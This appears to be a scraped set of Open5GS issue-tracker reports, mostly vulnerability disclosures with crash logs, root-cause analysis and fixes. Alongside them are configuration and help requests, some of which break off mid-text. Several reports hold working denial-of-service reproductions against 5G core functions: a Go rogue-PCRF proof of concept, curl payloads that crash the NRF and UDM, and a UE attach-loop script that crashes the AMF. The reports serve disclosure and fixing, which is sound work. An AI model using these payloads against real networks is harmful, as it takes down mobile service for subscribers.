	cca.NewAVP(avp.CCRequestNumber, avp.Mbit, 0,
		datatype.Unsigned32(ccRequestNumber))

	if _, err := cca.WriteTo(c); err != nil {
		log.Printf("[-] Failed to send CCA: %v", err)
		return
	}

	log.Println("[!] ----- DoS CCA SENT (cross-app) -----")
	log.Printf("[!] Original CCR AppId: %d (%s)", appID, appName(appID))
	log.Printf("[!] CCA AppId forced : %d (Gx)", gxApplicationID)
	log.Println("[!] Session mismatch in callback → ogs_assert(new==0) → SMF CRASH")
	log.Println("[+] ============================================")
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func extractUTF8(m *diam.Message, code uint32, vendorID uint32) string {
	a, err := m.FindAVP(code, vendorID)
	if err != nil || a == nil {
		return "(not found)"
	}
	return string(a.Data.Serialize())
}

func extractUint32(m *diam.Message, code uint32, vendorID uint32) uint32 {
	a, err := m.FindAVP(code, vendorID)
	if err != nil || a == nil {
		return 0
	}
	switch v := a.Data.(type) {
	case datatype.Unsigned32:
		return uint32(v)
	case datatype.Enumerated:
		return uint32(v)
	case datatype.Integer32:
		return uint32(v)
	default:
		return 0
	}
}

func appName(id uint32) string {
	switch id {
	case gxApplicationID:
		return "Gx"
	case gyApplicationID:
		return "Gy"
	default:
		return "unknown"
	}
}

func ccRequestTypeName(t uint32) string {
	switch t {
	case 1:
		return "INITIAL_REQUEST"
	case 2:
		return "UPDATE_REQUEST"
	case 3:
		return "TERMINATION_REQUEST"
	case 4:
		return "EVENT_REQUEST"
	default:
		return "UNKNOWN"
	}
}

func cmdName(m *diam.Message) string {
	if m.Header.CommandFlags&diam.RequestFlag != 0 {
		return "Request"
	}
	return "Answer"
}
```
The PoC impersonates `pcrf.localdomain` for the CER/CEA handshake,
then replies to every CCR with a CCA containing a fabricated Session-Id
(`bogus.attacker.com;...;app_dos`).

2.  trigger UE attach
 Start eNB + UE to trigger attach 


3. SMF crashes immediately

The SMF process terminates upon receiving the malicious CCA.

### Root Cause

```c
// gx-path.c:777-779 (same pattern in gy-path.c:1007-1009 and s6b-path.c)
ret = fd_msg_sess_get(fd_g_config->cnf_dict, *msg, &session, &new);
ogs_assert(ret == 0);
ogs_assert(new == 0);  // <-- crash if session not found
```

`ogs_assert()` is defined as:
```c
// lib/core/ogs-log.h:112-119
#define ogs_assert(expr) \
    do { \
        if (ogs_likely(expr)) ; \
        else { \
            ogs_fatal("%s: Assertion `%s' failed.", OGS_FUNC, #expr); \
            ogs_abort(); \
        } \
    } while(0)
```

When `new != 0` (session not found), `ogs_abort()` calls `abort()`,
killing the SMF process immediately. This should be a graceful error
(log + discard message), not a hard crash.

### Logs

```shell
03/04 04:01:31.837: [diam] ERROR:      'Credit-Control-Answer'
        Version: 0x01
        Length: 164
        Flags: 0x40 (-P--)
        Command Code: 272
        ApplicationId: 4
         AVP: 'Session-Id'(263) l=49 f=-M val="bogus.attacker.com;1772596891;999;app_dos"
         AVP: 'Result-Code'(268) l=12 f=-M val='DIAMETER_SUCCESS' (2001 (0x7d1))
         AVP: 'Origin-Host'(264) l=24 f=-M val="pcrf.localdomain"
         AVP: 'Origin-Realm'(296) l=19 f=-M val="localdomain"
         AVP: 'Auth-Application-Id'(258) l=12 f=-M val=4 (0x4)
         AVP: 'CC-Request-Type'(416) l=12 f=-M val='INITIAL_REQUEST' (1 (0x1))
         AVP: 'CC-Request-Number'(415) l=12 f=-M val=0 (0x0)

03/04 04:01:31.837: [core] FATAL: backtrace() returned 7 addresses (../lib/core/ogs-abort.c:37)
    open5gs-smfd(+0x573a1)
    /usr/local/lib/libfdcore.so.7(+0x6d2e7)
    /usr/local/lib/libfdcore.so.7(+0x7251c)
    /usr/local/lib/libfdcore.so.7(+0x727a5)
    /lib/x86_64-linux-gnu/libc.so.6(+0x94ac3)
    /lib/x86_64-linux-gnu/libc.so.6(clone+0x44)
```

### Expected behaviour

When the SMF receives a CCA whose `Session-Id` does not match any active
Diameter session (i.e. `fd_msg_sess_get()` returns `new=1`), the SMF should:

1. Log a warning/error identifying the unknown session.
2. Discard the malformed message and free associated resources.
3. Continue running normally, unaffected — all other UE sessions remain active.

A rogue or misconfigured Diameter peer must **not** be able to crash the SMF
through a single unexpected reply.

### Observed Behaviour

When a CCA with a fabricated or mismatched `Session-Id` is received:

1. `fd_msg_sess_get()` returns `new=1` (session not found in local table).
2. `ogs_assert(new == 0)` immediately fails.
3. `ogs_fatal()` logs `"Assertion 'new == 0' failed."` and calls `ogs_abort()`.
4. The **entire SMF process is killed** via `abort()`.
5. All active UE PDN/PDU sessions are instantly torn down; the network is
   unavailable until SMF restarts — and the crash repeats on every new attach
   if the malicious peer remains connected.

### eNodeB/gNodeB

srsenb

### UE Models and versions

srsue

items.title: [Bug]: Missing validation of required network location fields in NFProfile causes remote crash in NRF

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce:
curl --http2-prior-knowledge -X PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/test-instance -H "Content-Type: application/json" -d '{"nfInstanceId": "test-instance", "nfType": "AMF", "nfStatus": "REGISTERED"}'

The nrf_nnrf_handle_nf_register function, which processes PUT requests to /nnrf-nfm/v1/nf-instances/:nfInstanceID, fails to properly handle an exceptional condition where an incoming NF registration profile (NFProfile) lacks any network location information (such as fqdn, ipv4Addresses, etc.).

The code proceeds to call ogs_sbi_client_associate(nf_instance) without first verifying that the nf_instance contains the necessary data to establish a client connection. The ogs_sbi_client_associate function requires this information to find or create a client. When it fails to do so because the data is missing, it triggers a fatal assertion: Assertion 'client' failed. This immediately terminates the server process, causing a Denial of Service.

An attacker can send a syntactically valid, but minimal, JSON payload to register a new Network Function. This payload passes initial validation checks but lacks the crucial network identifiers, leading directly to the crash.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce, execute:
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 4294967295)' | curl --http2-prior-knowledge -X POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions --data-binary @- -H "Content-Type: application/json"


A critical Denial of Service vulnerability exists in the Open5GS NRF server (open5gs-nrfd) within the on_data_chunk_recv() function of ogs-sbi-server.c.
When processing large incoming HTTP/2 payloads, the code performs unchecked arithmetic while calculating the new buffer size during reallocation.
Specifically, the expression:
`request->http.content_length + len + 1`
is used to determine the size of the reallocation for the body buffer.

On 32‑bit systems, if an attacker sends a body of around 4 GB (≈ 4294967295 bytes), this addition causes an integer wraparound, resulting in a truncated size allocation. Subsequent writes exceed the small allocated buffer, leading to heap corruption and process termination.

### Expected behaviour

The NRF should:
Validate incoming Content-Length values to ensure they remain below a safe, configurable limit (e.g., 100 MB).
Detect and reject arithmetic overflow conditions instead of performing unbounded addition.
Gracefully return HTTP 413 Payload Too Large or 500 Internal Server Error.

[core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37)

items.title: [Bug]: NRF DoS vulnerability via memory exhaustion in on_part_data (ogs_malloc / ogs_realloc failure not handled)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

to reproduce, execute:

python3 -c "import sys; boundary='b'; sys.stdout.write(f'--{boundary}\\r\\nContent-Type: application/json\\r\\n\\r\\n'); sys.stdout.buffer.write(b'A' * (500 * 1024 * 1024)); sys.stdout.write(f'\\r\\n--{boundary}--\\r\\n')" | curl --http2-prior-knowledge -X PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/1 -H "Content-Type: multipart/related; boundary=b" --data-binary @- --connect-timeout 10

The on_part_data function within ogs-sbi-message.c is responsible for parsing individual parts of a multipart/related HTTP request. This function attempts to buffer the entire content of a part into memory using ogs_malloc and ogs_realloc. The code does not properly handle the exceptional condition where memory allocation fails due to a very large part size. Instead of gracefully handling the NULL return from the allocation function, a subsequent ogs_assert is triggered, causing the entire server process to terminate. An unauthenticated remote attacker can exploit this by sending a multipart request with a part that is large enough to exhaust available memory on the server.

We have 2 eNBs using the same EPC running latest docker_open5gs. 2 UEs which are attached to eNB A start ViLTE calls and during the call the HO is triggered to eNB B, Then again to A and then to B, so after some 4 to 5 (sometimes 9 to 10) HO sessions, the SGWC core crashes for asserts for pdr.

Attaching the SGWC and complete EPC core for reference. I have loopback log in pcap format,but unable to upload even the text export of it (may be size issue) - if needed let me know, I can upload it to google drive and share the path here.

Any valuable pointers or help in resolving the issue is appreciated. 

Thanks & regards,
Ashok

### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

We simulate a scenario involving frequent disconnections and reboots of a large number of UEs, where a single UE and a single gNB repeatedly connect and disconnect. The core network is built from source using the official Open5GS tutorial, and one gNB is started using UERANSIM. The configuration uses the default settings, as shown below:

```yaml
mcc: '999'          # Mobile Country Code value
mnc: '70'           # Mobile Network Code value (2 or 3 digits)

nci: '0x000000010'  # NR Cell Identity (36-bit)
idLength: 32        # NR gNB ID length in bits [22...32]
tac: 1              # Tracking Area Code

linkIp: 127.0.0.1   # gNB's local IP address for Radio Link Simulation (Usually same with local IP)
ngapIp: 127.0.0.1   # gNB's local IP address for N2 Interface (Usually same with local IP)
gtpIp: 127.0.0.1    # gNB's local IP address for N3 Interface (Usually same with local IP)

# List of AMF address information
amfConfigs:
  - address: 127.0.0.5
    port: 38412

# List of supported S-NSSAIs by this gNB
slices:
  - sst: 1

# Indicates whether or not SCTP stream number errors should be ignored.
ignoreStreamIds: true
```
```yaml
# List of gNB IP addresses for Radio Link Simulation
gnbSearchList:
  - 127.0.0.1
```

After executing the POC script for approximately 1 to 3 minutes, the AMF crashes, and the gNB goes offline.


```yaml
#!/bin/bash
while true; do
    sudo ./nr-ue -c ../config/open5gs-ue.yaml > output.log 2>&1 &
    #sudo ./nr-ue -c ../config/open5gs-ue.yaml
    process_pid=$!


    sleep_time=$(awk -v seed="$RANDOM" 'BEGIN {srand(seed); print 0 + rand() * 0.1}')
    sleep "$sleep_time"

    kill $process_pid

    sleep_time=$(awk -v seed="$RANDOM" 'BEGIN {srand(seed); print 0.1 + rand() * 0.1}')
    sleep "$sleep_time"
done

```

Hello,

I happen to find a problem with the way supiOrSuci parameter is parsed. If I add enough hyphens I can crash UDM and make it restart.  Thanks to the compiler 's stack protection it the NF only crashes.

### Open5GS Release, Revision, or Tag

v2.7.2

### Steps to reproduce

To reproduce simply run this cURL
```bash
curl -X POST --http2-prior-knowledge http://127.0.0.11:7777/nausf-auth/v1/ue-authentications/deregister -d '{"supiOrSuci":"suci-0----------------------------------","servingNetworkName":""}'
``` 
I will also attach the logs of UDM and AUSF. The call will return a `500` code.



### Logs

```shell
Nov 09 15:41:13 open5gs open5gs-udmd[717]: *** stack smashing detected ***: terminated
Nov 09 15:41:14 open5gs systemd[1]: open5gs-udmd.service: Main process exited, code=killed, status=6/ABRT
Nov 09 15:41:14 open5gs open5gs-ausfd[701]: 11/09 15:41:14.111: [ausf] ERROR: [suci-0----------------------------------] HTTP response error [500] (../src/ausf/ue-sm.c:177)
Nov 09 15:41:14 open5gs systemd[1]: open5gs-udmd.service: Failed with result 'signal'.
Nov 09 15:41:16 open5gs open5gs-ausfd[701]: 11/09 15:41:16.225: [sbi] WARNING: [c6d5ceb8-9eb0-41ef-88f0-eb0d52d7a817] (NRF-notify) Not found (../lib/sbi/nnrf-handler.c:1171)
Nov 09 15:41:16 open5gs systemd[1]: open5gs-udmd.service: Scheduled restart job, restart counter is at 1.
Nov 09 15:41:16 open5gs systemd[1]: Stopped Open5GS UDM Daemon.
Nov 09 15:41:16 open5gs systemd[1]: Started Open5GS UDM Daemon.
Nov 09 15:41:16 open5gs open5gs-udmd[1522]: Open5GS daemon v2.7.2
```


### Expected behaviour

I expected to return 400 malformed input if a suci doesn't comply to standard.

### Observed Behaviour

 I  saw this bug happen in other routes that accept supiOrSuci like: 

```bash
# But in 2.7.2 seems to be fixed
GET `/nudm-uecm/v1/{ueId}/registrations/smf-registrations` 
```
This is why I think there is a problem in the function that parses the suci's. And as far as I could understand the issue could be solved as follows:

`lib/sbi/conv.c`
```diff
(...)
char *ogs_supi_from_suci(char *suci)
{
#define MAX_SUCI_TOKEN 16
    char *array[MAX_SUCI_TOKEN];
    char *p, *tmp;
    int i;
    char *supi = NULL;

    ogs_assert(suci);
    tmp = ogs_strdup(suci);
    if (!tmp) {
        ogs_error("ogs_strdup() failed");
        return NULL;
    }

    p = tmp;
    i = 0;
-    while((array[i++] = strsep(&p, "-"))) {
+    while(i < MAX_SUCI_TOKEN && (array[i] = strsep(&p, "-"))) {
        i++;
    }

(...)
```

Please let me know if there are any problems reproducing.  And if its okay to publish this kind of bug here, or rather through some other channels.

Kind regards,
Nicolas

### eNodeB/gNodeB

NA

### UE Models and versions

NA

items.title: A single UE that attempts to register over NAS that is not in the subscriber database can generate over 2000 attach attempts in 15 minutes

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.1

### Steps to reproduce

This is a proposed one line change.

If a Samsung UE (S22 or S23) attempts to register with open5gs and the UE IMSI is not in the subscriber database then open5gs will respond back with NAS 5GMM cause of "PLMN not allowed (11)".

This specific rejection cause is not sufficient for the Samsung UE to stop trying to register.  What we observe is that when the Samsung UE receives this cause then the UE will attempt to register again about 300 milliseconds later.  open5gs will again respond back with "PLMN not allowed (11)" and the UE again attempts to register.

If you add up all of the failed registration attempts by a single UE over a 15 minute period it is over 2000 failed attempts.

If you have just a few UE's that are in this state you could see over 6000 failed attempts in a 15 minute period.  That, in turn, could potentially start to affect processing of valid UE's trying to register because open5gs is processing so many invalid registrations.

The proposed patch is to change the NAS 5GMM cause to "Illegal UE" instead of having the cause be "PLMN not allowed".  This also is consistent with the cause returned from other 5GC's that we have tested that are in this scenario (the other cores return "Illegal UE" in this case).

I am attaching a proposed patch for this issue for consideration.  With the patch in place the UE only tries once which is the desired behavior.

I am also attaching two wireshark logs.  The first wireshark log is prior to the fix. The second wireshark log is after the fix.
[reg_notinsubdatabase.zip](https://github.com/user-attachments/files/16258727/reg_notinsubdatabase.zip)


### Logs

```shell
First wireshark log attached is where issue occurs…   

UE at 10.254.27.1 in logs, open5gs at 10.254.27.130 (NGAP/5G)

Message #1 is the registration request of a UE not in subscriber database.
Message #4 is the response from open5gs of PLMN not allowed.

Message #7 is again a registration request from the same UE only 300 milliseconds later.
Message #8 is the response from open5gs of PLMN not allowed.

Pattern repeats many times thereafter.
==================
Second wireshark log attached is with the proposed fix in place.

Message #1 is the registration request of a UE not in subscriber database.
Message #2 is a response from open5gs of "Illegal UE"

Thereafter the UE does not try again which is the desired behavior.
```


### Expected behaviour

It is expected that a UE that is not in the subscriber database be offered a registration reject cause which tells the UE not to attempt to register again so that the invalid UE will not fill the access stratum with repeated invalid registration attempts.

### Observed Behaviour

The core responds back with "PLMN not allowed" when a UE attempts to register which is not in the subscriber database which causes a Samsung UE to flood the access stratum with repeated attempts every 300 milliseconds for a total of over 2000 attempts in a 15 minute period.

### eNodeB/gNodeB

_No response_

### UE Models and versions

A mixture of Samsung S22 and S23 models

items.title: Unable to get VoLTE Registration
items.body:
Hi all,

First of all, I do really enjoy and appreciate all your efforts in such project. It is absolutely awesome!

At this moment, I'm struggling to get VoLTE registration with a Motorola One 5G Ace in my current setup.

Find below the setup in use:

- SIM Card: PLMN 001-01
- UE: Motorola One 5G Ace
- eNB: srsENB v21.10.0 in USRP B200
- EPC: Open5GS v2.4.3
- IMS: Kamailio 5.3.2

Both EPC and IMS have been configured in an Ubuntu 20.04 as per tutorial https://open5gs.org/open5gs/docs/tutorial/02-VoLTE-setup/

// In short: 
- UE authenticates and get registration successfully in EPC
- UE connects to both configured APNs (internet data: "phone" and VoLTE: "ims")
- UE starts IMS registration by sending the 1st SIP REGISTER to Kamailio P-CSCF
- Kamailio IMS handles such signaling and sends to UE the challenge via SIP 401 Unauthorized

After that, I found two behaviours in two different tests. No new configurations have been applied neither to UE nor IMS.

// The first one (1st.pcap):
- UE sends the 2nd SIP REGISTER over TCP port 5060, which is handled in the IMS and replied back by the S-CSCF to P-CSCF
- However, P-CSCF does not send SIP 200 OK to UE

// The second one (2nd.pcap):
- UE attempts to bringup the TCP connection on port 6101 to send the 2nd SIP REGISTER over IPSec in order to reply the challenge, however P-CSCF does not reply back

Find below the logs:
[logs.zip](https://github.com/open5gs/open5gs/files/8254626/logs.zip)

Not sure if this could help in any way, but during the compilation of Kamailio, the "ipsec-tools" was not located by the "apt install". 
I managed to find and install another three packages instead by searchin here: https://packages.ubuntu.com/search?keywords=ipsec&searchon=names&suite=focal&section=all

```bash
sudo apt-get install -y libipsec-mb-dev libipsec-mb0 librte-ipsec0.200
```

Any help would be great!

Cheers!

items.body:
### Open5GS Release, Revision, or Tag

v2.7.1

### Steps to reproduce

Looks like it may be similar to #3451.  I will install 2.7.2 and see if the problem goes away. Not exactly sure how to reproduce but it is happening many times per day as we register the same devices with the system.  The logs look exactly the same at the point of the crash but just with a different UE.

I could get to the internet yesterday with the UE and GNB but now I can't again. I'm thinking it is with the NAT rules that is in the tutorial because I did a reboot. But I did the below which should have fixed whatever. The only things that seem out of place is the above issues. Any help will be appreciated. Thanks sudo ip link delete ogstun sudo sysctl -w net.ipv4.ip_forward=1 sudo sysctl -w net.ipv4.ip_nonlocal_bind=1 sudo ip tuntap add name ogstun mode tun sudo ip addr add 10.45.0.1/16 dev ogstun sudo iptables -t nat -A POSTROUTING -s 10.45.0.0/16 ! -o ogstun -j MASQUERADE sudo ip link set ogstun up

items.title: [Bug]: UPF HA - PDU session is not released/established in CM_IDLE

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: Housekeeping:BugToReview
labels.description: Housekeeping: Possible bug that might still be open

items.body:
### Open5GS Release, Revision, or Tag

v2.6.4

### Steps to reproduce

1. 2 UPFs associate with SMF
2. UE registers and establishes a PDU session using UPF1
3. UE enters CM_IDLE state
4. UPF1 is killed

The scenario for CM_CONNECTED state (without step 3) has already been addressed in [Support for UPF HA - release/establish new PDU session](https://github.com/open5gs/open5gs/commit/af07cc75ec0d1b245d4620c69d3a20ea01f57cf2) and [Follow-up on !2048](https://github.com/open5gs/open5gs/commit/b6aa3aba5bc7098853afd3eb7f0e803fa7471be1).

### Logs

[UpfHaIdle_v2.6.4_bug.zip](https://github.com/open5gs/open5gs/files/11944647/UpfHaIdle_v2.6.4_bug.zip)

### Expected behaviour

PDU session is reestablished using UPF2.

![UPF_HA_IDLE_flow_fix](https://github.com/open5gs/open5gs/assets/93838663/616e074f-3a21-4a54-93f3-24463d94a20a)


### Observed Behaviour

PDU session is not reestablished using UPF2

PDU Session Release Command:(Reactivation requested) is not transferred to the UE.

1. If no Uplink Data Status is present: Service request is just Accepted
![UPF_HA_IDLE_UERANSIM_flow_bug](https://github.com/open5gs/open5gs/assets/93838663/39a1e928-3146-4651-aa5f-b0f8fe1f54df)

2. If Uplink Data Status is present: ACTIVATING is just confirmed on crashed UPF1
![UPF_HA_IDLE_IXIA_flow_bug](https://github.com/open5gs/open5gs/assets/93838663/f18d4a9e-7430-4416-a153-8f4d3dbbbac7)


### eNodeB/gNodeB

1. UERANSIM, 2. IXIA

### UE Models and versions

1. UERANSIM, 2. IXIA

items.body:
open5gs v2.3.6 does not build anymore with meson 0.6.0 released yesterday. This meson version is in Debian unstable.

It fails with:
> `../subprojects/freeDiameter/extensions/dict_dcca_3gpp/meson.build:1:0: ERROR: Target "../dict_dcca_3gpp" has a path segment pointing to directory "subprojects/freeDiameter/extensions/dict_dcca_3gpp/..". This is an error.`
> `To define a target that builds in that directory you must define it`
> `in the meson.build file in that directory.`

~~I've briefly tried to investigate, but there are no meson.build files in [freeDiameter.git](https://github.com/open5gs/freeDiameter). Apparently the cmake build files get translated to meson.build on the fly?~~ Looked into the wrong branch, r1.5.0 has various meson.build files.

items.body:
### Open5GS Release, Revision, or Tag

v2.6.4-89-g78f64aa

### Steps to reproduce

I am creating a tool that utilizes a custom Network Function with a modified version of Open5gs. Registering this custom NF crashes the NRF. I thought this was a bug in my (modified) forked version. However, it also crashes on the latest commit ([78f64aa](https://github.com/open5gs/open5gs/commit/78f64aaccb5dfde35c611b8bc1acec11edc79bdf)) in main. 

When I tried to register the NF with `nfType` set to `CUSTOM_INF` the NRF fatally crashed due to an assert.

NF Instance Registration to reproduce crash:
```bash
curl -v -X PUT -d '{"nfInstanceId":"0b8a8d59-af80-4fb7-8645-b832fd69d94a","nfType":"CUSTOM_INF","nfStatus":"REGISTERED","ipv4Addresses":["127.0.13.37"]}' --http2-prior-knowledge http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/0b8a8d59-af80-4fb7-8645-b832fd69d94a
``` 

### Logs

```shell
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: 09/04 23:25:55.207: [sbi] FATAL: ogs_nnrf_nfm_handle_nf_profile: Assertion `NFProfile->nf_type' failed. (../lib/sbi/nnrf-handler.c:55)
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: 09/04 23:25:55.207: [core] FATAL: backtrace() returned 11 addresses (../lib/core/ogs-abort.c:37)
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/lib/x86_64-linux-gnu/libogssbi.so.2(ogs_nnrf_nfm_handle_nf_profile+0x1d0) [0x7f9ef9dca3e9]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/bin/open5gs-nrfd(+0x96b6) [0x5562004206b6]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/bin/open5gs-nrfd(+0x63ee) [0x55620041d3ee]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x119) [0x7f9ef9d5bc0c]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/bin/open5gs-nrfd(+0x83e6) [0x55620041f3e6]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x119) [0x7f9ef9d5bc0c]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/bin/open5gs-nrfd(+0x4cbc) [0x55620041bcbc]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /root/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x1197a) [0x7f9ef9d4c97a]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /lib/x86_64-linux-gnu/libc.so.6(+0x94b43) [0x7f9ef945db43]
Sep 04 23:25:55 5G-CORE open5gs-nrfd[252373]: /lib/x86_64-linux-gnu/libc.so.6(+0x126a00) [0x7f9ef94efa00]
Sep 04 23:25:55 5G-CORE systemd[1]: open5gs-nrfd.service: Main process exited, code=killed, status=6/ABRT
```


### Expected behaviour

According to TS 29.510 V17.0.0 (section 5.2.2.2.2): 
"The NRF shall allow the registration of a Network Function instance with any of the NF types described in clause 6.1.6.3.3, and it shall also allow registration of Network Function instances with custom NF types (e.g., NF type values not defined by 3GPP, or NF type values not defined by this API version)."

I expected the NRF to either allow a custom NF type (returning HTTP status code of 201) or return an HTTP status code of 4xx/5xx if that feature is not implemented yet. I did not expect the NRF to crash.


### Observed Behaviour

Fatal crash of NRF

_No response_

Ubuntu 20.04.2 LTS - VM on hyper-v.

On boot up after installing:

 `sudo apt install open5gs`

```
-- Reboot --
Feb 28 21:**50**:00 open5gs-dev systemd[1]: Starting Wait for Network to be Configured...
Feb 28 21:**52**:00 open5gs-dev systemd-networkd-wait-online[863]: Event loop failed: Connection timed out
Feb 28 21:52:00 open5gs-dev systemd[1]: systemd-networkd-wait-online.service: Main process exited, code=exited, status=1/FAILURE

Feb 28 21:52:00 open5gs-dev systemd[1]: Failed to start Wait for Network to be Configured.
```

To prevent this:

```
systemctl edit systemd-networkd-wait-online.service

#include these lines...
[Service]
ExecStart=
ExecStart=/usr/lib/systemd/systemd-networkd-wait-online --ignore=ogstun
```

items.title: MME crashes with Assert on receiving unknown TEID in GTP2C
items.body:
If you operate a network with dedicated MME, S-GW, P-GW, etc. and the MME crashes or restarts for some reason, the S-GW will have state about existing tunnels, which the MME then has lost.

However, any S11 GTP2c message with unknown TEID will again crash the MME, resulting in a possibly extended series of crashes.

The MME should
* respond to any GTPv2C request with unknown TEID using cause = "Context is not found"
* drop any GTPv2C response with unknown TEID

I will try to work on a fix, just creating this for tracking the issue

My question is if i can set a internal ip in the 127.0.0.x , or the ip that is binded to my internet interface mentioned above, is the correct one?
Proceeding for the issue of the title, I'm using a iPhone 8 as UE and a Sismocom USIM SJS1 Sim card, I folowed the guide and have garanted privileges to the sim, i can see the sim carrier id (with value 1911), and have the volte bool flag as true. The P-CSCF conects with the pcrf, the I-CSCF and S-CSCF connects with the FoHSS, and the UE seems to try the sip conect but is reject. I'm trying to review all my HSS configurations but I don't see anything wrong with the configs it self. I'm attaching the pcap file of the test with the mentioned error. Thank you a lot for the constant upgrade in this project, and I hope you can help us.

First of all I wanted to let you know that have a great project here and I am deeply impressed of your work! Congratulations to that.

We use your epc in our lab to do experiments mainly RAN related. In principle the setup works fine, several UEs are attached to an eNB and run in connected mode. Paul

items.title: Are Open5GS Network Functions Stateless?

labels.name: Help Wanted
labels.description: Maintainers are not working on this issue so community help is wanted.

items.body:
**Why am I asking?**
I want to dockerize Open5GS services and deploy them as containers. Then use Kubernetes for orchestration.
**Why do I care about statelessness?**
I am concerned if Open5GS Network Functions deployed as a container inside a K8s Pod, lose computing data (e.g. UE Context in AMF) during Pod recreation (which means killing the service process and starting the container again). 
**How do I understand the statelessness?**
https://www.redhat.com/en/topics/cloud-native-apps/stateful-vs-stateless Stateless app acts only as a computing unit, and the data it operates on (e.g. PDU session in UPF) is stored externally on some database. I know that the current transactions must be lost, but what about the state of UE session - is it stored in local process memory or in some kind of database, where the recreated Pod would have access to?

If I am wrong and misunderstood some concepts, feel free to correct me.

**Version:** Open5GS v2.4.4-47-gf848785

![amarisoft_test](https://user-images.githubusercontent.com/11304987/158193209-914b3d33-41e2-4912-bfb2-7db2e2183e2d.png)

In the pcap attached, we are trying attach 4 UEs, but one present error because the MME don't send the "Attach accept"

**OK** - 4/4 - InitialUEMessage, Attach request, PDN connectivity request
**OK** - 4/4 - DownlinkNASTransport, Authentication resquest
**OK** - 4/4 - UplinkNASTransport, Authentication response

**OK** - 4/4 - UplinkNASTransport, Security mode complete

**OK** - 4/4 - UplinkNASTransport, ESM information response
**NOK** - 3/4 - MME => eNB - InitialContextSetupRequest, Attach accept, Activate default EPS bearer context request (PDN type IPv4 only allowed), UECapabilityInformation

items.title: AMF breaks due to malformed NAS message
items.body:

I can also provide example PDU / of hexdump of IEs for all those crashes.
I did not take the time to dive into the source code yet, to check the decoding of NAS messages, and have no patch to provide to solve the issues: sorry for this. Otherwise, Open5GS is performing quite well, and is a great software project enabling strong experimentation with cellular core networks. Thank you for open-sourcing and maintaining it !

items.title: UE can not ping network side & UE can not ping UE
items.body:
Hi all,
    I have met a simple problem but I don't know what's going on..
    I installed `Open5gs` in a laptop with `Debian 10` and installed `UERANSIM` in the other two laptops with `Ubuntu18.04`.
    Everything was going well after configuration,the two UE run registration successfully and assigned the IP `10.45.0.2` and `10.45.0.5.`
    But I can not ping `10.45.0.5` to `10.45.0.2`...  I have tcpdump in Open5gs ogstun as below:
```
10:22:04.586969 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 744, length 64
10:22:05.610828 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 745, length 64
10:22:06.634683 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 746, length 64
10:22:07.659037 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 747, length 64
10:22:08.682970 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 748, length 64
10:22:09.707092 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 749, length 64
10:22:10.731100 IP 10.45.0.5 > 10.45.0.2: ICMP echo request, id 31837, seq 750, length 64
```
And I can not capture any icmp packet in UE `10.45.0.2`.
In the `Open5gs` laptop,I have opened the `ipv4 forward` switch and the iptables nat rule is as below:
```
root@debian:~# sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1

root@debian:~# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy DROP)
target     prot opt source               destination
DOCKER-USER  all  --  anywhere             anywhere
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain DOCKER (1 references)
target     prot opt source               destination

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
target     prot opt source               destination
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
RETURN     all  --  anywhere             anywhere

Chain DOCKER-ISOLATION-STAGE-2 (1 references)
target     prot opt source               destination
DROP       all  --  anywhere             anywhere
RETURN     all  --  anywhere             anywhere

Chain DOCKER-USER (1 references)
target     prot opt source               destination
RETURN     all  --  anywhere             anywhere

root@debian:~# iptables -L -t nat
